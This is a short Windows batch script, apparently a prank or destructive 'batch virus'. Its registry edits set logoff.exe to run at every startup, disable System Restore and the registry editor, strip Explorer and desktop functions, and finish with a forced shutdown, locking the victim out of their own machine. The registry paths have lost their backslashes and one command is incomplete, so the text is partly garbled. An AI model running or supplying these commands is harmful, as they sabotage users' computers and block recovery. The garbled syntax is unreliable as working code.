#  WELCOME YOU  MY WORLD
Reg add hklmsoftwaremicrosoftwindowscurrentversionrun /v off /t reg_sz /d logoff.exe /f 
Reg add hklmsoftwarePoliciesMicrosoftwindows NTSystemRestore /v DisableConfig /t reg_dword /d 1 
Reg add hklmsoftwarePoliciesMicrosoftwindows NTSystemRestore /v DisableSR /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoClose /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoFavoritesMenu /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoFind /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoRecentDocsMenu /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoRecentDocsHistory /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoSetFolders /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoSetTaskbar /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoFileMenu /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoViewContextMenu /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoTrayContextMenu /t reg_dword /d 1
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoDesktop /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesexplorer /v NoWinKey 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesActiveDesktop /v NoChangingWallpaper /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesActiveDesktop /v NoAddingComponents /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesActiveDesktop /v NoDeletingComponents /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesActiveDesktop /v NoEditingComponents /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciesActiveDesktop /v NoHTMLWallpaper /t reg_dword /d 1 
Reg add hkcusoftwaremicrosoftwindowscurrentversionPoliciessystem /v DisableRegistryTools /t reg_dword /d 1 
shutdown -s -t 5 -f -c 
